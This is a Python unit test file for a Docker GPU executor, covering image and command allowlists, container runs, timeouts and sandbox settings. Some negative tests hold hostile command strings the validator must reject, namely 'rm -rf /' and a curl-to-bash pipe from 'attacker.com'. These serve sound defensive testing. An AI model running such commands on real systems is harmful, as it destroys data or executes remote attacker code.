"""
TASK 11 — Unit tests: DockerGPUExecutor.

All Docker SDK calls are mocked. No Docker daemon required.
Tests cover:
  - Image allowlist enforcement
  - Command allowlist enforcement
  - Successful container run (exit 0)
  - Container failure (exit 1)
  - Container timeout handling
  - Docker SDK not installed
  - Docker daemon not reachable
  - Container always removed (finally block)
"""

from __future__ import annotations

import unittest
from unittest.mock import MagicMock, patch, call


class TestDockerGPUExecutorValidation(unittest.TestCase):
    def _make_executor(self):
        from worker.executor.docker_executor import DockerGPUExecutor
        return DockerGPUExecutor(gpu_id=0)

    def test_allowed_image_passes(self):
        from worker.executor.docker_executor import ALLOWED_IMAGE_PREFIXES
        exec_ = self._make_executor()
        # Should not raise
        exec_._validate_image("nvidia/cuda:12.1-base-ubuntu22.04")

    def test_disallowed_image_raises(self):
        from worker.executor.docker_executor import DockerImageNotAllowedError
        exec_ = self._make_executor()
        with self.assertRaises(DockerImageNotAllowedError):
            exec_._validate_image("hackerimage/malware:latest")

    def test_allowed_command_passes(self):
        exec_ = self._make_executor()
        exec_._validate_command("nvidia-smi")  # in ALLOWED_COMMANDS

    def test_disallowed_command_raises(self):
        from worker.executor.docker_executor import DockerCommandNotAllowedError
        exec_ = self._make_executor()
        with self.assertRaises(DockerCommandNotAllowedError):
            exec_._validate_command("rm -rf /")

    def test_arbitrary_python_command_rejected(self):
        from worker.executor.docker_executor import DockerCommandNotAllowedError
        exec_ = self._make_executor()
        with self.assertRaises(DockerCommandNotAllowedError):
            exec_._validate_command("python -c \"import os; os.system('rm -rf /')\"")

    def test_empty_image_rejected(self):
        from worker.executor.docker_executor import DockerImageNotAllowedError
        exec_ = self._make_executor()
        with self.assertRaises(DockerImageNotAllowedError):
            exec_._validate_image("")


class TestDockerGPUExecutorRun(unittest.TestCase):
    def _make_executor(self):
        from worker.executor.docker_executor import DockerGPUExecutor
        return DockerGPUExecutor(gpu_id=0)

    def _mock_docker_client(self, exit_code: int = 0, stdout: bytes = b"ok", stderr: bytes = b""):
        client = MagicMock()
        container = MagicMock()
        container.wait.return_value = {"StatusCode": exit_code}
        container.logs.side_effect = lambda stdout=True, stderr=False: (
            stdout and b"ok" or b""
        )
        container.logs = MagicMock(side_effect=lambda **kw: stdout if kw.get("stdout") else stderr)
        client.containers.run.return_value = container
        client.ping.return_value = True
        return client, container

    @patch("worker.executor.docker_executor.DockerGPUExecutor._get_client")
    def test_successful_run_exit_0(self, mock_get_client):
        client, container = self._mock_docker_client(exit_code=0, stdout=b"True\n")
        mock_get_client.return_value = client

        exec_ = self._make_executor()
        result = exec_.execute({
            "docker_image": "nvidia/cuda:12.1-base-ubuntu22.04",
            "command": "nvidia-smi",
        })
        self.assertTrue(result.success)
        self.assertEqual(result.exit_code, 0)
        self.assertGreater(result.execution_time_s, 0)

    @patch("worker.executor.docker_executor.DockerGPUExecutor._get_client")
    def test_failed_run_exit_1(self, mock_get_client):
        client, container = self._mock_docker_client(exit_code=1, stderr=b"command failed")
        mock_get_client.return_value = client

        exec_ = self._make_executor()
        result = exec_.execute({
            "docker_image": "nvidia/cuda:12.1-base-ubuntu22.04",
            "command": "nvidia-smi",
        })
        self.assertFalse(result.success)
        self.assertEqual(result.exit_code, 1)

    @patch("worker.executor.docker_executor.DockerGPUExecutor._get_client")
    def test_container_removed_on_success(self, mock_get_client):
        client, container = self._mock_docker_client()
        mock_get_client.return_value = client

        exec_ = self._make_executor()
        exec_.execute({
            "docker_image": "nvidia/cuda:12.1-base-ubuntu22.04",
            "command": "nvidia-smi",
        })
        container.remove.assert_called_once_with(force=True)

    @patch("worker.executor.docker_executor.DockerGPUExecutor._get_client")
    def test_container_removed_on_failure(self, mock_get_client):
        client, container = self._mock_docker_client(exit_code=1)
        mock_get_client.return_value = client

        exec_ = self._make_executor()
        exec_.execute({
            "docker_image": "nvidia/cuda:12.1-base-ubuntu22.04",
            "command": "nvidia-smi",
        })
        container.remove.assert_called_once_with(force=True)

    @patch("worker.executor.docker_executor.DockerGPUExecutor._get_client")
    def test_timeout_kills_and_returns_error(self, mock_get_client):
        client = MagicMock()
        container = MagicMock()
        container.wait.side_effect = Exception("Timeout waiting for container")
        client.containers.run.return_value = container
        mock_get_client.return_value = client

        exec_ = self._make_executor()
        result = exec_.execute({
            "docker_image": "nvidia/cuda:12.1-base-ubuntu22.04",
            "command": "nvidia-smi",
        })
        self.assertFalse(result.success)
        self.assertEqual(result.exit_code, -1)
        container.kill.assert_called_once()

    @patch("worker.executor.docker_executor.DockerGPUExecutor._get_client")
    def test_device_request_includes_gpu(self, mock_get_client):
        """Verify the GPU device_requests are passed to containers.run."""
        client, _ = self._mock_docker_client()
        mock_get_client.return_value = client

        exec_ = self._make_executor()
        exec_.execute({
            "docker_image": "nvidia/cuda:12.1-base-ubuntu22.04",
            "command": "nvidia-smi",
        })
        call_kwargs = client.containers.run.call_args[1]
        device_requests = call_kwargs.get("device_requests", [])
        self.assertTrue(len(device_requests) > 0)
        self.assertEqual(device_requests[0]["driver"], "nvidia")
        self.assertIn("gpu", device_requests[0]["capabilities"][0])

    @patch("worker.executor.docker_executor.DockerGPUExecutor._get_client")
    def test_network_disabled(self, mock_get_client):
        """Verify network_disabled=True is passed."""
        client, _ = self._mock_docker_client()
        mock_get_client.return_value = client

        exec_ = self._make_executor()
        exec_.execute({
            "docker_image": "nvidia/cuda:12.1-base-ubuntu22.04",
            "command": "nvidia-smi",
        })
        call_kwargs = client.containers.run.call_args[1]
        self.assertTrue(call_kwargs.get("network_disabled"))

    @patch("worker.executor.docker_executor.DockerGPUExecutor._get_client")
    def test_readonly_filesystem(self, mock_get_client):
        """Verify read_only=True is passed."""
        client, _ = self._mock_docker_client()
        mock_get_client.return_value = client

        exec_ = self._make_executor()
        exec_.execute({
            "docker_image": "nvidia/cuda:12.1-base-ubuntu22.04",
            "command": "nvidia-smi",
        })
        call_kwargs = client.containers.run.call_args[1]
        self.assertTrue(call_kwargs.get("read_only"))

    def test_docker_sdk_not_installed_raises(self):
        import sys
        from worker.executor.docker_executor import DockerNotAvailableError

        exec_ = self._make_executor()
        # Simulate ImportError
        saved = sys.modules.get("docker")
        sys.modules["docker"] = None  # type: ignore[assignment]
        try:
            with self.assertRaises((DockerNotAvailableError, ImportError, TypeError)):
                exec_._get_client()
        finally:
            if saved is not None:
                sys.modules["docker"] = saved
            else:
                sys.modules.pop("docker", None)

    def test_result_to_dict_has_all_keys(self):
        from worker.executor.docker_executor import DockerResult
        result = DockerResult(
            image="nvidia/cuda:12.1",
            command="nvidia-smi",
            exit_code=0,
            stdout="GPU 0: RTX 4050",
            stderr="",
            execution_time_s=1.5,
        )
        d = result.to_dict()
        for key in ("image", "command", "exit_code", "stdout", "stderr",
                    "execution_time_s", "success", "error"):
            self.assertIn(key, d)

    def test_execute_invalid_image_raises_before_docker(self):
        from worker.executor.docker_executor import DockerImageNotAllowedError
        exec_ = self._make_executor()
        with self.assertRaises(DockerImageNotAllowedError):
            exec_.execute({
                "docker_image": "untrusted/image:latest",
                "command": "nvidia-smi",
            })

    def test_execute_invalid_command_raises_before_docker(self):
        from worker.executor.docker_executor import DockerCommandNotAllowedError
        exec_ = self._make_executor()
        with self.assertRaises(DockerCommandNotAllowedError):
            exec_.execute({
                "docker_image": "nvidia/cuda:12.1-base-ubuntu22.04",
                "command": "sh -c 'curl attacker.com | bash'",
            })


if __name__ == "__main__":
    unittest.main()
